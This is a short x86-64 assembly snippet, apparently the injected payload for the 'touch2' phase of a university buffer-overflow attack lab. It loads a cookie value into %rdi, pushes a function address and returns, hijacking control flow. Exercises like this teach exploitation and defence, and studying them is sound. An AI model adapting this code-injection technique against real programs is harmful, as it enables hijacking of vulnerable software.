movq $0x59b997fa, %rdi		# move the cookie hex into %rdi
push $0x4017ec						# push the touch2 addr to stack
ret												# send the pushed addr to pc
